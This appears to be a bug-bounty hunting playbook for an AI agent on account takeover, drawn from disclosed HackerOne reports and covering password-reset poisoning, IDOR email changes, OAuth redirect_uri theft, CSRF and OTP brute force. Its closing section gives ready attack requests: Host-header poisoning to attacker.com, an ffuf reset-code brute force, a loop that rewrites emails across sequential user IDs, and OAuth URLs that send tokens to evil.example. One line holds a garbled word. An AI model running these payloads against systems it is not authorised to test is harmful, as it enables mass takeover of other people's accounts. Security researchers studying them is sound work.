---
name: hunt-account-takeover
description: "Powerful hunting skill for ACCOUNT TAKEOVER, built from 206 assigned reports of which 157 full disclosed reports were read end-to-end (TOP-list first, then votes). Covers the full ATO destination class: password-reset poisoning and token abuse (#2293343, #1175081, #173551, #685007), email-change and IDOR ATO (#915114, #950881, #1695454), OAuth/SSO redirect_uri and state abuse (#905607, #317476, #3723458, #1567186), CSRF-to-ATO (#419891, #2652603, #127703, #423022), pre-account and unverified-account takeover (#1679734, #1074047), passwordless and magic-link abuse (#143717, #855618), OTP/SMS brute-force (#773519, #407971, #2748003), session and cookie theft via XSS and request smuggling (#737140, #735638), 2FA-linking IDOR (#810880), cache deception (#1698316), response manipulation (#1490470), and JWT/expiry flaws (#1760403). Use when hunting any ATO primitive, chaining primitives toward full takeover of a SECOND account, or validating whether a reported bug is a real zero/one-click ATO. Gate: prove takeover of test account B from attacker A's session/IP; OOB/Collaborator confirm blind token-leak steps."
sources: hackerone_public, public_research, top_lists, disclosed_report_mining
report_count: 206
full_reports_read: 157
---

## Crown Jewel Targets

Account takeover is a **destination class**, not a single bug. The study pack's 157 full reports show ATO is most valuable — and most paid — when the primitive needs little or no victim interaction and lands on an account the attacker does not already control. Highest-value targets first:

- **Password-reset / forgot-password flows** — the single densest cluster (brute-otp-reset: 46 full reports). Target any `/forgot-password`, `/reset-password`, `/resetpassword`, `/PKI/PassReset.aspx`, `/orchestrator/v1/password_reset/start`, or password-reset API that accepts a token, OTP, or email array. Disclosed: #2293343 ($35,000), #1175081 (same token to two emails), #173551 ($10,000, token in response), #2194928 (temp password in response), #2748003 (no rate limit, PII disclosure). The reset mailer is a trust boundary: whatever builds the link or chooses the recipient is a potential ATO sink.
- **Email-change / account-settings endpoints** — change the recovery address, then trigger reset. The "no current-password / no confirm-link to the old address" variant is Critical. Disclosed: #915114 and #950881 (IDOR on sequential user IDs, zero interaction), #1695454 (API application IDOR leaks tokens), #538800 and #419891 (CSRF on `/signup/email` for unconfirmed accounts), #906790 and #45084 (email added without verification or password confirmation).
- **OAuth / SSO authorization and callback endpoints** — `redirect_uri`, `state`, `callback_url`, RelayState, and `code`/`access_token` handling. Open redirect plus OAuth is a recurring mass-ATO chain. Disclosed: #905607 (open redirect to token leak), #206591 (`state` used as redirect location), #317476 (Host header redirects OAuth), #3723458 (regex bypass steals transfer token), #110293 (callback-locking bypass), #1567186 (Apple sign-in code theft), #1923672 (RelayState open redirect).
- **CSRF-protected (or CSRF-unprotected) state-changing account forms** — connect/link account, change security question, change email/password, profile edit. Disclosed: #419891, #2652603 (security questions), #127703 (link social account), #423022 (connect Yahoo), #2699029 and #2712857 (profile edit), #1046630 (null-byte state bypass).
- **Multi-tenant / team / invitation / provisioning flows** — SCIM, invites, team-member editing, "unverified" signups. Pre-account takeover and cross-tenant reset live here. Disclosed: #3178999 (SCIM provisioning), #915110 (invitation confirmation link with no email check), #1074047 (OAuth pre-account), #1679734 (Shopify Collabs creator takeover), #3378635 (cross-tenant reset), #1224008 and #273647 (register same email twice).
- **OTP / SMS / magic-link / passwordless endpoints** — `/SessionCreate`+`/SessionVerify`, `/rt/users/passwordless-signup`, `/otp-login`, email verification codes. Disclosed: #143717 (set any user's password by phone number), #1245762 (deterministic session token across OTP steps), #855618 (intercept magic link), #773519 and #922418 (SMS OTP brute), #407971 (email verification codes brute).
- **Session/cookie surfaces and shared/proxy infrastructure** — anything that sets, reflects, caches, or leaks a session token (XSS, request smuggling, cache deception, `/cookies` gadget endpoints). Disclosed: #737140 (Slack mass ATO via request smuggling), #1698316 (cache deception of `HASESSIONV3`), #534450 (`/cookies` get/set gadget), #735638 (XSS steals Meteor login token), #745324 (leaked session cookie).
- **Password-change and current-password fields with weak rate limits** — the persistence multiplier after cookie theft. Disclosed: #827484 and #1165285 (no rate limit on current password), #1065186 and #1170522 (weak password policy/rate limit), #147203 (insecure password change mechanism).

Why these pay: the top-grossing reports in the corpus combine **zero interaction** with **mass reach**. #2293343 ($35,000) is a password reset requiring no user action; #737140 is a mass session-cookie harvest; #915114 and #950881 scale across sequential user IDs. A primitive that only locks the attacker out of their own account, or only works when the attacker already holds the victim's password *and* session, is not an ATO — it is a self-ATO and gets rejected.

What does NOT count as ATO on its own: a reflected parameter, an open redirect with no token flow, a CSRF on a non-identity action, a rate-limit missing on `/forgot-password` with no token-guessing impact, or a token that appears in an email the attacker cannot read. Every one of these must be chained to a demonstrable takeover of account B.

### Frequency map (which ATO families dominate the corpus)

The 157-read corpus is heavily skewed; prioritize accordingly when time is limited.

| ATO family | Study-pack signals (full reports) | Representative disclosures |
|---|---|---|
| Reset / OTP abuse | brute-otp-reset 46, api-endpoint 45 | #2293343, #1175081, #173551, #2748003 |
| CSRF to identity change | csrf 43, filter-bypass 28 | #419891, #2652603, #127703, #1046630 |
| OAuth / SSO | sso-oauth 32, redirect-handling 42, open-redirect 14 | #905607, #1567186, #3723458 |
| Session / cookie | cookie-handling 38, session-attack 36, cache-layer 11 | #737140, #1698316, #745324 |
| Subdomain / redirect target | subdomain-takeover 136, subdomain 10 | #3723458, #1434967 |
| IDOR / object ref | idor-object-ref 12, admin-internal 17 | #915114, #950881, #1695454 |
| Pre-account / misconfig | misconfiguration 12, auth-bypass 10 | #1679734, #1074047, #3378635 |

---

## Attack Surface Signals

### Endpoint / URL patterns to hunt
```
/forgot-password            /reset-password             /resetpassword
/PKI/PassReset.aspx         /password_reset/start       /signup/email
/api/auth/facebook          /api/auth/google            /api/2fa/verify
/accounts/profile           /account/profile/edit       /member/updatesecurityquestions
/rt/users/passwordless-signup                            /SessionCreate
/SessionVerify              /otp-login                  /magic-link
/api/users/{id}             /users/invite-user.php      /cms/reader/account
/wp-json/wp/v2/users/{id}   /api/v1/users.info          /api/applications
/oauth/authorize            /oauth/token                /oauth/callback
/signin/callback            /api/account/password       /account/email
/scim/v2/Users              /invite/accept              /user/account
```

### Parameter / field names to look for
```
redirect_uri   redirectUrl   callbackUrl   callback_url   state        code
continue       RelayState    rt             token          reset_token  next
email[]        new_email     email          phoneNumberE164 application[id]
id             member_id     user_id        UID2           userId       username
csrf           authenticity_token          _idnonce       challenge    challenge_answer
casing         janrain_nonce  guvo          d (session)    HASESSIONV3  Meteor.loginToken
```

### Header / response signals
```
Host: attacker.com  /  X-Forwarded-Host / X-Host / X-Forwarded-Server
Referer leak on reset pages (third-party scripts) -> token in Referer
Access-Control-Allow-Origin: *  / reflected Origin  -> CORS credential theft
X-Cache / no-cache missing -> Web Cache Deception of session-bearing page
Set-Cookie without HttpOnly / Secure / SameSite -> cookie theft via XSS
Location header built from user input -> open redirect into OAuth
Response body echoes reset token / temp password (#173551, #2194928)
JSON {"status":false} -> flip to true in Burp (#1490470)
```

### Tech-stack / workflow signals
- **OAuth/OIDC/SAML sign-in with "link another account"** — CSRF on the link callback is a top ATO (#127703, #423022, #225653). The link endpoint often uses a GET workflow with only a weak `rt`/`state` nonce.
- **Freshly migrated / rebranded platforms** — new code paths with missing verification (Shopify Collabs #1679734 after the Dovetale migration, Mattermost #1114347). New subdomains and "new platform" rollouts are high-yield recon targets.
- **Sequential numeric user IDs** — mass ATO by IDOR (#915114 used a `00010006`–`19920500+` range, #950881, #685338, #1004750).
- **Cloudflare / reverse-proxy fronting** — cache deception and CSRF-token caching (#1698316, #260697, #1632973).
- **Mobile, deeplink, and WebView flows** — insecure intent handling (#2516732), universal XSS in WebView via `loadDataWithBaseURL` (#1455987), deeplink ATO (#1667998), Androidوكbersecurity token theft via `%09` (#763058).
- **GSuite / enterprise SSO identity** — Google OneTap unverified-email ATO (#671406), cross-org SSO (#976603), RelayState open redirect (#1923672).
- **PHP/ASP.NET classic auth pages** — `PassReset.aspx`, `default.asp?update=yes`, and `myprofile.asp` forms show up repeatedly in DoD and legacy targets (#2748003, #670924, #2194928).

### Response-shape tells that a primitive is live
- A reset request whose **response body contains a token or temp password** (#173551, #2194928).
- Two different recipient emails receiving the **same token** (#1175081).
- An email-change request that succeeds with **no `current_password` field** and persists after relog (#292673).
- A `Location` header or `#?token=` fragment pointing at a domain you control (#905607).
- An API error page that **prints the requested object's secrets** when optional fields are stripped (#1695454).
- A cached page that still contains `HASESSIONV3` after appending a static extension (#1698316).

### Mobile / client-side signals
- **Exported Android activities and WebViews** — `SMFeedbackActivity` loads `Intent Extras` into `loadDataWithBaseURL()`, producing universal XSS and session theft (#1455987). Treat any WebView that renders externally controlled HTML as a session-token sink.
- **Insecure intent handling** — ATO via intent redirection (#2516732), GitHub token theft via `%09` (#763058), and deeplink ATO in `com.kayak.android` (#1667998).
- **Hardcoded OAuth secrets in mobile apps** — the Periscope consumer key/secret were recovered by reverse engineering (#110293). The secret alone is not the finding; it is the key to bypassing callback locking.
- **Service workers and JS bundles** — check for CSRF nonces (`url_stats` in #127703) and domain-validation regexes (`libs/urls/src/regexp...` in #3723458).

### Vulnerable-code grep patterns
```bash
# Identity-changing writes that trust a request parameter
grep -rE "(email|userId|user_id|member_id|application\[id\])\s*=\s*req\.(body|query|params)" --include="*.js" --include="*.php"
# Link building from request Host / redirect params
grep -rE "(Host|redirect_uri|redirectUrl|callbackUrl|RelayState|continue)\s*=\s*req\.(headers|query|body)" --include="*.js"
# Missing CSRF / no-store on sensitive pages
grep -rE "(csrf|no-cache|no-store|HttpOnly|SameSite)" --include="*.js" --include="*.conf"
# Dangerous DOM sinks that can leak auth tokens
grep -rE "(innerHTML|postMessage|window\.name|loadDataWithBaseURL)\s*\(" --include="*.js" --include="*.java"
```

---

## Discovery Patterns From 157 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

Ranked by how often the signal appeared across the 157 full reports and by the verbatim "how I found it" lines.

1. **Authentication and account-management endpoints** — *what to look for:* every forgot/reset/change-email/change-password/2FA/link-account/verify endpoint. Note which require a current password, which send tokens, which accept an email array, and which trust a user ID. (#1175081 found the email-array bug by intercepting the forgot-password request in Burp; #2194928 noticed the site "send temp password in forget password request"; #1490470 intercepted the admin login response.)
2. **Subdomain and wildcard recon** — *what to look for:* dangling CNAMEs, forgotten staging/dev/CMS hosts, and any `*.target.com` accepted by `redirect_uri` (subdomain-takeover appeared in 136 reports). (#685338 came from "poking around a /24 range ... looking for the Cisco devices"; #3723458 registered a domain that passed the validation regex; #1434967 took over a GitHub account via a docs-page subdomain.)
3. **OAuth/SSO flow mapping** — *what to look for:* `state` that is not random, `redirect_uri` that reflects, `code` delivered to off-origin hosts, callback locking. (#905607 started with "I found an open redirect"; #1567186 with researching postMessage code theft; #110293 recovered embedded consumer secrets by reverse engineering the mobile app.)
4. **API endpoint enumeration and fuzzing** — *what to look for:* REST/GraphQL user, token, and application endpoints that take an object ID (api-endpoint: 45). (#1695454 moved an API app by changing `application[id]`; #2450685 used `wp-json/wp/v2/users/15` for PII; #842625 used `/api/v1/users.info?userId=...` to harvest reset hashes.)
5. **CSRF surface sweep** — *what to look for:* state-changing GETs, forms with no token/nonce, nonces leaked in JS or JSON (csrf: 43). (#127703 found the `rt` CSRF token leaked in `chrome-service-worker.js`; #2699029 "found it vulnerable to CSRF so I tried to escalate it Account takeover and I succeed"; #1090982 found a non-changing `_idnonce`.)
6. **Cookie and session handling** — *what to look for:* `/cookies`-style get/set gadgets, session mismatch, missing HttpOnly, cacheable pages reflecting session (cookie-handling: 38, session-attack: 36). (#534450 exposed a cookie get/set endpoint on `gnar.grammarly.com`; #745324 leaked a HackerOne staff session; #1698316 found `HASESSIONV3` in a cached page.)
7. **Proxy / request-smuggling / edge layers** — *what to look for:* CL.TE/TE.CL desync on short-link or admin hosts; the classic mass-cookie-theft chain. (#737140 ran `smuggler -u https://slackb...` and stole `d` cookies at scale; #740037 reproduced request smuggling on `admin-official.line.me`.)
8. **Client-side JS source review and public code search** — *what to look for:* hard-coded secrets, CSRF nonces in bundles, unreferenced endpoints (js-source-review: 14, public-code-search: 15). (#129873 read `cdn.digits.com/1/sdk.js` and found `search(t.origin)`; #3608199 audited the Fizzy source for `innerHTML`; #895650 downloaded a repo config from an exposed `.git`.)
9. **Cache layers** — *what to look for:* pages with session/CSRF data served with cacheable extensions; Cloudflare in front (cache-layer: 11). (#1698316 fetched `/profile/edit/x.jpeg` and grepped for `HASESSIONV3`; #260697 found CSRF tokens cached on CloudFlare-fronted Discourse.)
10. **Response manipulation in Burp** — *what to look for:* auth decisions made client-side; flip `status:false` to `true` or `400` to `200` (#1490470, #332632, #1994227).
11. **Google dorking and leaked credentials** — *what to look for:* usernames/passwords in URLs indexed by VirusTotal, cleartext reset emails (google-dorking: 1). (#411920 found credentials in URLs via VirusTotal; #173251 saw the reset email sent in cleartext; #1817214 "was fed up not getting any bugs and was thinking to try my luck using google dorking".)
12. **Mobile, deeplink, and WebView surfaces** — *what to look for:* exported activities, `loadDataWithBaseURL`, intent extras, password-reset deeplinks (#1455987, #2516732, #1667998, #763058).

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Frequencies are the number of full reports containing each signal (study pack section 1).

| # | Signal | Freq | Why it matters | What to probe |
|---|--------|------|----------------|---------------|
| 1 | subdomain-takeover | 136 | Token/code theft via claimed `redirect_uri` host; wildcards accepted by auth | Enumerate `*.target.com`, find dangling CNAME, test `redirect_uri=https://anything.target.com/cb` |
| 2 | brute-otp-reset | 46 | Reset/OTP codes guessable when unthrottled | ffuf 6-digit codes; sample 5 tokens for entropy; test no rate limit |
| 3 | api-endpoint | 45 | Object refs and token endpoints reachable via API | Fuzz `/api/*` with id/userId/email params; test mass assignment |
| 4 | csrf | 43 | State-changing account actions without user consent | Drop token field; reuse token across accounts; test GET-state changes |
| 5 | search-filter-sort | 42 | Often a wrapper for hidden params or parameter pollution | Parameter-name brute with ffuf on account forms |
| 6 | redirect-handling | 42 | Open redirect becomes OAuth token leak | `redirectUrl=//evil.com`, `https://target///evil.com`, regex bypasses |
| 7 | cookie-handling | 38 | Cookie get/set gadgets, leakage, fixation | Probe `/cookies`-style endpoints, reflected cookies, missing flags |
| 8 | image-processing | 37 | Co-occurs with XSS/session-theft chains | Check import/preview features that render filenames or HTML (#3608199) |
| 9 | session-attack | 36 | Session fixation/reuse enables ATO | Reuse session token across states; test `/SessionCreate` determinism |
| 10 | sso-oauth | 32 | Implicit/callback/state flaws give one-click ATO | Test `state` reuse, `response_type` switch, callback-locking bypass |
| 11 | filter-bypass | 28 | Validation can be evaded | Null byte, case, punycode, double-encode, regex unescaped-dot |
| 12 | comment-injection | 26 | Comment/code fields that echo into auth flows | Inject into social-link/comment endpoints |
| 13 | xml-parser | 25 | Parser quirks co-occur with auth flows in corpora | Test SAML/XML auth responses for parsing confusion |
| 14 | server-side-rendering | 23 | SSR leaks `href`/state into pages | Check `href` reflection of auth tokens (#1567186) |
| 15 | url-fetching | 17 | Server-fetched URLs leak tokens | Test off-origin resource loads on reset pages (Referer leak) |
| 16 | admin-internal | 17 | Admin endpoints with weak auth | Probe admin login response manipulation, WP REST `/users/{id}` |
| 17 | blind-oob | 15 | Blind token/code leak needs OOB confirmation | Collaborator listener on callback/off-origin host |
| 18 | public-code-search | 15 | Secrets and endpoints in repos | Search GitHub for hardcoded client secrets/internal hosts |
| 19 | open-redirect | 14 | Direct primitive for token theft | Test `///`, `%2f%2f`, `continue` param regex |
| 20 | js-source-review | 14 | CSRF nonce/token leakage in bundles | Grep JS for `rt`, `csrf`, `state`, `url_stats` |
| 21 | dos-resource | 13 | Co-occurs with unthrottled auth flows | Check rate limits on OTP/reset/password-change |
| 22 | idor-object-ref | 12 | Change any user's email/password/token | Swap `id`/`userId`/`member_id`/`application[id]` |
| 23 | misconfiguration | 12 | Confirmation links/tokens not invalidated | Reuse old email link after change; stale verification tokens |
| 24 | proxy-feature | 12 | Proxy/import flows carry auth tokens | Test "import from Facebook" token reuse (#121827) |
| 25 | cache-layer | 11 | Web Cache Deception of session page | Append `.jpeg`/`.css` to authenticated URL; read cached session |
| 26 | auth-bypass | 10 | Login logic client-side or verifiable by response | Flip `status`, status code, skip verification step |
| 27 | json-body | 9 | Mass assignment hidden in JSON arrays/fields | Send `email` as array; add extra fields to reset/password APIs |
| 28 | dom-based | 8 | DOM sinks leak auth state | Check `innerHTML`, `href`, `postMessage` handlers |
| 29 | stored | 8 | Stored XSS persists to session theft | Store payload in fields rendered on login/profile pages |
| 30 | cors-misconfig | 7 | Cross-origin read of account data | Reflect `Origin`, `ACAO:*` with credentials (#426147, #758785) |
| 31 | reflected | 7 | Reflected token in error/page | Inject marker into reset/link params, find reflection |
| 32 | path-traversal-lfi | 5 | Co-occurs with auth-flow recon | Check `..%2f` on reset/import endpoints |
| 33 | import-feature | 5 | Import pages render filenames/HTML | Test filename preview with `innerHTML` (#3608199) |
| 34 | template-injection | 5 | Templates reflect reset tokens | Inject into email/template fields |
| 35 | base64-encoding | 5 | Tokens hidden in encoded logs/params | Decode base64 strings found in responses (#894863) |
| 36 | internal-network | 4 | Internal hosts in error messages | Pivot to internal admin/auth endpoints |
| 37 | clickjacking | 4 | UI redress to type password/click delete | Frame sensitive pages (#2119892, #892289) |
| 38 | jwt-token | 4 | Forged/expired token accepted | Test signature validation and `exp` claim (#1760403) |
| 39 | request-smuggling | 2 | Mass cookie theft via desync | `smuggler` on short-link/admin hosts (#737140, #740037) |
| 40 | host-header | 2 | Reset link built from Host -> attacker domain | Swap `Host`/`X-Forwarded-Host`; read the real email |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

These are verbatim "how I found it" lines from the disclosed text. They show the researcher's actual entry point — mine your target the same way.

- `[#737140]` "My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform."
- `[#737140]` "I was running `smuggler -u https://slackb." — automated desync scanning found the mass-cookie-theft ATO.
- `[#1567186]` "I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit."
- `[#905607]` "I found an open redirect on `https://cs." — the open redirect was the entry to a full OAuth ATO.
- `[#1679734]` "I found a way to take over the account of **arbitrary creators** by using the new platform collabs."
- `[#1490470]` "I found that i can bypass the login page of the Admin account by intercepting the respone of the login request of ```█████``` subdomain and change ```status``` from ```false``` to ```true```"
- `[#1046630]` "I have found a bypass to the this report." — a null byte in `state` bypassed a prior CSRF fix.
- `[#1245762]` "During the **authentication** flow, an SMS is sent to the user in order to validate the session and proceed to the user account."
- `[#810880]` "I found 2 vulnerabilities in your 2FA implementation:" — 2FA-linking IDOR plus verify without credentials.
- `[#423022]` "I noticed Connect Yahoo account option have the workflow with GET method and there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account"
- `[#2699029]` "During my search in this domain I found it vulnerable to CSRF so I tried to escalate it Account takeover and I succeed"
- `[#127703]` "I have noticed that the `rt` parameter is returned on almost all json responses so I tried to find a link that leaks it."
- `[#1695454]` "I created an API application and tried to update it, I saw this request :" — IDOR on `application[id]`.
- `[#1175081]` "But, I noticed that if we add another email in the request of forgot password through Burpsuite then both person will get the same password reset token in their email."
- `[#2652603]` "I discovered that an attacker could exploit a CSRF vulnerability to perform a password reset and gain full control of any user's account."
- `[#332632]` "I was able to go through the process even after providing non-existing usernames and tokens by intercepting the **response** in BurpSuite and changing the status code from **400 Bad Request** to **200 OK**"
- `[#685338]` "I discovered IDOR possibility to mass accounts takeover just by altering a numeric ID."
- `[#3608199]` "While auditing the latest Fizzy code and validating it end to end in a live Docker deployment of current `main`, I found that the account import page renders the selected local filename with `innerHTML` instead of `textContent`."

Pattern across these clues: almost none started with a pre-built exploit. They started with **recon of an auth-adjacent surface** (an open redirect, a CSRF nonce in a JSON response, an API request, a smuggler scan, a source-code audit), then escalated. The lesson for hunting is to aggressively map the auth perimeter and watch for the small anomalous signal — a reflected token, a permissive parameter, a client-side decision — and then drive it to a second account.

### Probe Checklist (15 concrete probes)

1. **Host-header reset poisoning:** `POST /forgot-password` with `Host: attacker.com` and `X-Forwarded-Host: attacker.com`; read the real email in your controlled inbox/Collaborator to see where the link actually points. (#317476, #1108874.) A reflected header in the response is not proof — read the email.
2. **Email-array mass assignment:** change `{"email":"victim@x"}` to `{"email":["victim@x","you@x"]}` on forgot-password — do both receive the *same* token? (#1175081.) Also test extra fields like `casing` (#419891).
3. **Reset token in response:** initiate reset for a known account and read the raw HTTP response for a token or temp password. (#173551, #2194928.) This removes the need for inbox control entirely.
4. **Token entropy and reuse:** request 5 tokens, diff for sequential/time-based patterns; use one token twice and after an email change. (#685007, #1114347, #890196 where `challenge` was the MD5 of a timestamp.)
5. **IDOR email change:** with attacker-A session, send `PATCH /api/user/{victim_id}` with `{"email":"you@evil.com"}`, then trigger reset. (#915114, #950881.) Confirm the change persisted by reloading the victim's profile.
6. **Email change without re-auth:** change email with no current-password/OTP/confirm-link; log in with the new password from a clean browser. (#292673, #45084, #906790.) Test skipping even the new-address confirmation.
7. **OAuth redirect_uri reflection:** `redirect_uri=https://evil.example/cb` and `https://target.com///evil.example` — does the `code` arrive at your listener? (#905607.) Test double-encoded `%252f` variants too.
8. **Regex-domain bypass:** register a domain that passes the validation regex (unescaped dot) and test `continue`/transfer-token theft. (#3723458.) Check the frontend bundle for the regex source (`libs/urls/src/regexp...`).
9. **state / CSRF nonce leak and reuse:** grep JS for the nonce; try null byte `%00` in `state`; reuse a CSRF token across accounts. (#127703, #1046630.) Check service workers and `/api/me` JSON.
10. **Account-link CSRF:** host a GET/POST auto-submit that links attacker's social account to victim; require only one victim click. (#127703, #423022, #225653.) Drop the request so the single-use code is not consumed during PoC building (#1046630).
11. **2FA-linking IDOR:** POST `/api/2fa` with victim `id`, then `/api/2fa/verify` with only `id` + valid code. (#810880, #2492631.) Confirm the victim had no 2FA seeded.
12. **OTP / current-password brute:** ffuf numeric codes and password fields with no rate limit; confirm a valid login lands. (#773519, #407971, #827484, #2748003.) Rate-limit-only findings on `/forgot-password` are routinely rejected — show token guessing.
13. **Passwordless / magic-link by identifier:** POST only a phone/email to `/rt/users/passwordless-signup` or a magic-link endpoint; does it set a password or issue a session? (#143717, #855618.) Enumerate identifiers to prove arbitrary reach.
14. **Cache deception and cookie gadgets:** GET authenticated `/profile` with a `.jpeg` suffix via curl and grep for the session; probe `/cookies` get/set endpoints. (#1698316, #260697, #534450.) Check `X-Cache`/`Cf-Cache-Status` headers.
15. **Pre-account / cross-tenant signup:** register or attach your email to an unverified/invited identity, then let the victim SSO in and inherit your seeded state. (#1679734, #1074047, #3378635, #192648.) Confirm the victim lands in the account you seeded.

### Probe Success Criteria (how you know a probe actually hit)

Each probe above is only positive if you observe the specific server-side effect below; a reflected value alone is a negative result.

1. **Host header:** the actual email body's reset URL uses your domain, and clicking it lands on your server with a valid token.
2. **Email array:** both inboxes contain the identical token string (diff them), and it resets the victim account.
3. **Token in response:** the token in the raw response successfully resets B's password.
4. **Entropy / reuse:** a fresh brute lands on B, or the old token still resets after an email change.
5. **IDOR email change:** B's profile shows your email, and `/forgot` for B arrives at your inbox.
6. **No re-auth email change:** a clean-browser login with the new credential succeeds.
7. **redirect_uri reflection:** your listener logs B's `code`/token, exchangeable for a session.
8. **Regex bypass:** the lookalike host receives a transfer or auth token for B.
9. **nonce / state:** your CSRF PoC changes B's account with one click; OOB hit tied to one parameter.
10. **Account-link CSRF:** B's profile shows your linked social account.
11. **2FA IDOR:** a clean login as B with only the code succeeds.
12. **OTP / current-password brute:** a valid login for B is produced, not just a generic "success" response.
13. **Passwordless / magic link:** B's password is changed (or a session issued) from the identifier alone.
14. **Cache / cookie:** a fresh fetch of the cacheable URL returns B's session token.
15. **Pre-account:** B, after signing in, lands inside the account you seeded with your data.

---

## Step-by-Step Hunting Methodology

1. **Pick a destination, not a bug.** Decide which ATO path you are proving: reset abuse, email change, OAuth, CSRF, pre-account, OTP, session theft, or 2FA. Map every endpoint that can change identity state (email, password, linked account, session, MFA). Keep a Burp sitemap of just these endpoints.
2. **Create two controlled accounts, A (attacker) and B (victim).** You must own B's inbox/phone so you can read tokens and prove takeover without touching a real user. Everything is measured as "can A take B from A's session/IP/device?". Never test against accounts you do not control.
3. **Enumerate recon surfaces in the ranked order** above: auth endpoints, subdomains, OAuth params, API objects, CSRF forms, cookies, proxy/edge, JS bundles, cache. Record exact requests and note any missing security control at each hop.
4. **For reset flows:** capture the forgot-password request. Try Host/X-Forwarded-Host swaps, email arrays, token-in-response, token reuse, no-expiry, and entropy sampling (Probes 1–4). Read the *actual* email — never infer from a reflected header. If a token appears in the response body, you can skip inbox control entirely (#173551).
5. **For email-change or IDOR:** replace the object id with B's id; verify the change took effect server-side by triggering a reset to your mailbox and logging in. Try stripping optional fields so the endpoint errors out and prints the object's secrets (#1695454).
6. **For OAuth/SSO:** walk the full authorize-to-callback flow in Burp. Log the `code`/`access_token` destination. Test `redirect_uri` reflection, `state` predictability/reuse, `response_type` switch, and subdomain/dangling-CNAME acceptance; OOB-confirm that the code actually arrives at your host. Decode error bodies as JSON — a literal `access_token` substring inside a claims field is not a usable token.
7. **For CSRF:** remove the token/nonce, then try token reuse and cross-account tokens; look for nonces leaked in JS/JSON; auto-submit the request from an attacker page and confirm the victim's account state changed with one click. Hold back single-use codes during PoC construction (#1046630).
8. **For pre-account or unverified flows:** register, invite, or SCIM-provision B's identifier with your controlled email/phone first; then let B sign in and confirm they land in your seeded account. Test both "email never confirmed" and "invite not accepted" states (#1679734, #3178999).
9. **For OTP/2FA/passwordless:** test throttle, code entropy, identifier-only password/session issuance, and IDOR on the verify endpoint. Confirm with a clean-session login as B. Watch for deterministic session tokens across OTP steps (#1245762).
10. **For session/cookie theft:** check XSS reflection of cookies/localStorage, `/cookies`-style gadgets, WebView `loadDataWithBaseURL`, request smuggling, and cacheable session pages. Steal B's cookie in a controlled way and demonstrate an authenticated action as B (#737140, #735638, #1698316, #534450).
11. **Escalate for impact:** a no-step-up password change (no "current password" field) turns a transient cookie theft into persistent ATO. Test it with the stolen B cookie, then confirm B is locked out (#827484, #147203).
12. **Run the Severity Gate:** Critical = zero/low interaction; High = one click or a pre-existing session; Medium = phishing plus active interaction; Low/Invalid = MitM-only or self-account impact. A CSRF needing the victim to click, enter credentials, and pass CAPTCHA is not Critical.
13. **Gate 0 validation** (below): reproduce from scratch in a fresh browser in 10 minutes or less, taking over B from A's session.
14. **Document the chain:** each hop with request/response pairs, the token's destination, and a clean-browser login as B. For blind token/code leaks, include the Collaborator hit tied to the exact parameter and a negative control showing which parameter is inert.

### Per-path expectation matrix

| Path | Minimum proof | Typical victim interaction | Severity when proven |
|---|---|---|---|
| Host-header reset poisoning | Reset link built from attacker Host; token read from inbox | One click | Critical |
| IDOR email change to reset | Victim email rewritten, reset to attacker | None | Critical |
| Reset token in response | Token in raw response resets B | None | Critical |
| Reusable / non-expiring token | Old token still resets after state change | None | High |
| OTP / reset-code brute | Fresh brute produces a B session | None | High |
| OAuth redirect_uri theft | Code arrives at attacker host and exchanges | One click | Critical |
| CSRF on identity change | One-click PoC changes B's account | One click | High |
| Pre-account / SSO seeding | B signs into attacker-seeded account | B signs in normally | High |
| 2FA-linking IDOR | Clean login as B with code only | None | High |
| Session theft + no step-up | Password set from stolen cookie | None | Critical |
| Request smuggling | Multiple victim cookies captured OOB | Passive | Critical |

---

## Payload & Detection Patterns

### Password reset poisoning & token abuse
```bash
# Host-header poisoning variants (read the real email, not the reflected header)
POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
email=victimB@company.com
# dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

# Email-array mass assignment — both get the SAME token (#1175081)
POST /resetpassword
Content-Type: application/json
{"email":["victim@gmail.com","you@gmail.com"]}

# OTP/reset-code brute with no rate limit (#773519, #407971, #2748003)
ffuf -u "https://target/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5

# ASP.NET reset with hidden inputs / postback (#2748003)
# scrape __VIEWSTATE/__EVENTVALIDATION then POST ctl00$cphPage$btnForgotPassword

# Token reuse / no-expiry / stale-link after email change (#685007, #1114347)
request token -> wait 2h -> still valid?    # no-expiry
use token once -> use again -> valid?       # reuse
change email -> old link still verifies?    # stale confirmation
```

### IDOR / email-change ATO
```bash
# Change victim email, then reset (#915114, #950881, #1695454)
PATCH /api/users/19920465
Cookie: session=ATTACKER_A_SESSION
{"email":"attacker@evil.com"}

# Sequential IDs -> mass ATO (#685338, #1004750)
for id in $(seq 00010006 19920500); do
  curl -s -b "session=A" -X PATCH "https://target/api/users/$id" \
       -d '{"email":"you@evil.com"}' &
done

# Strip optional fields so error page prints the object's secrets (#1695454)
PUT /api/applications
application[id]=<victim_id>&authenticity_token=<token>
# error "Name must be provided" reveals Client ID / Client Secret

# Email change with no re-auth -> reset lands at attacker (#292673, #45084)
PUT /api/account/email
Cookie: session=A
{"new_email":"attacker@evil.com"}   # no current_password / no OTP / no confirm
```

### OAuth / SSO / redirect_uri
```bash
# Open redirect into OAuth token leak (#905607)
GET /oauth/authorize?client_id=...&redirectUrl=https://target///evil.example%23&callbackUrl=https://target///evil.example%23
# -> victim lands on https://evil.example/#?token=...

# redirect_uri reflection / wildcard subdomain (#206591, #1923672)
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
GET /sso?RelayState=https://evil.example/        # insufficient URL validation

# Regex unescaped-dot bypass -> one-time transfer token theft (#3723458)
# register a domain that passes KA_DOMAIN_REGEX, then:
GET /login?continue=https://registered-lookalike.example/cb

# state null-byte CSRF bypass (#1046630)
# take the link-account callback, append %00 to state, host as CSRF PoC

# response-type switch + postMessage/href leak (#1567186)
